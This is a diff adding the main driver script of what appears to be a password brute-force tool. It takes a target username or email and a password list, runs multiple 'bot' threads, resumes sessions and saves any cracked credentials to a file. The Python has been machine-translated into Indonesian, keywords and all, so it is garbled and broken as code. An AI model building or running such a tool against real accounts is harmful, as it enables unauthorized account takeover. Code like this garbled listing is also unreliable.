@@ -1,0 +1,115 @@
+# Penulis: Mohamed
+
+
+dari os.path ada impor
+dari lib.bruter import Bruter
+dari lib.session impor Session
+dari lib.display Display impor
+dari lib.const kredensial impor , mode
+dari argparse import ArgumentParser, ArgumentTypeError
+
+
+ Mesin kelas ( objek ):
+
+    def  __init__ ( mandiri , nama pengguna , utas , passlist_path ):  
+        self .bruter =  Tidak ada 
+        self .resume =  Salah 
+        self .is_alive =  Benar 
+        self .threads = utas
+        self .display = Tampilan ()
+        self .username = nama pengguna
+        self .passlist_path = passlist_path
+        self .session = Session (nama pengguna, passlist_path)
+
+    def  passlist_path_exists ( mandiri ):
+        jika  tidak ada ( self .passlist_path):
+            self .display.warning ( ' Path tidak valid ke daftar kata sandi ' )
+            mengembalikan  False
+        mengembalikan  True 
+
+    def  session_exists ( self ):
+        mengembalikan  diri .session.exists
+
+    def  create_bruter ( mandiri ):
+        self .bruter = Bruter ( self .username, self .threads, self .passlist_path, self .resume)
+
+    def  get_user_resp ( mandiri ):
+        return  self .display.prompt ( ' Apakah Anda ingin melanjutkan serangan? [y / n]: ' )
+
+    def  write_to_file ( mandiri , kata sandi ):
+        dengan  terbuka (kredensial, ' at ' ) sebagai f:
+            data =  ' Nama Pengguna : {} \ n Kata Sandi: {} \ n \ n ' .format ( self .username.title (), kata sandi)
+            f.write (data)
+
+     mulai def ( diri ):
+        jika  bukan  self .passlist_path_exists ():
+            self .is_alive =  Salah 
+
+        jika  self .session_exists () dan  self .is_alive:
+            resp =  Tidak Ada 
+
+            coba :
+                resp =  self .get_user_resp ()
+            kecuali :
+                self .is_alive =  Salah 
+
+            jika resp dan  self .is_alive:
+                jika resp.strip (). lebih rendah () ==  ' y ' :
+                    self .resume =  Benar 
+
+        jika  diri .is_alive:
+            self .create_bruter ()
+
+            coba :
+                diri .bruter.start ()
+            kecuali  KeyboardInterrupt :
+                self .bruter.stop ()
+                self .bruter.display.shutdown ( self .bruter.last_password,
+                                            self .bruter.password_manager.attempts, len ( self .bruter.browsers))
+            akhirnya :
+                diri .stop ()
+
+    def  stop ( diri sendiri ):
+        jika  diri .is_alive:
+
+            self .bruter.stop ()
+            self .is_alive =  Salah 
+
+            jika  self .bruter.password_manager.is_read dan  bukan  self .bruter.is_found dan  bukan  self .bruter.password_manager.list_size:
+                self .bruter.display.stats_not_found ( self .bruter.last_password,
+                                                    self .bruter.password_manager.attempts, len ( self .bruter.browsers))
+
+            jika  self .bruter.is_found:
+                self .write_to_file ( self .bruter.password)
+                self .bruter.display.stats_found ( self .bruter.password,
+                                                self .bruter.password_manager.attempts, len ( self .bruter.browsers))
+
+
+def  valid_int ( n ):
+    jika  tidak n.isdigit ():
+        meningkatkan ArgumentTypeError ( ' mode harus angka ' )
+
+    n =  int (n)
+
+    jika n >  3 :
+        meningkatkan ArgumentTypeError ( ' maksimum untuk mode adalah 3 ' )
+
+    jika n <  0 :
+        meningkatkan ArgumentTypeError ( ' minimum untuk mode adalah 0 ' )
+
+    kembali n
+
+def  args ():
+    args = ArgumentParser ()
+    args.add_argument ( ' nama pengguna ' , help = ' email atau nama pengguna ' )
+    args.add_argument ( ' passlist ' , help = ' daftar kata sandi ' )
+    args.add_argument ( ' -m ' , ' --mode ' , default = 2 , type = valid_int, help = ' mode: 0 => 16 bot; 1 => 8 bot; 2 => 4 bot; 3 => 2 bot ' )
+    kembalikan args.parse_args ()
+
+
+if  __name__  ==  ' __main__ ' :
+    arugments = args ()
+    mode = arugments.mode
+    username = arugments.username
+    passlist = arugments.passlist
+Engine (nama pengguna, mode [mode], passlist) .start ()
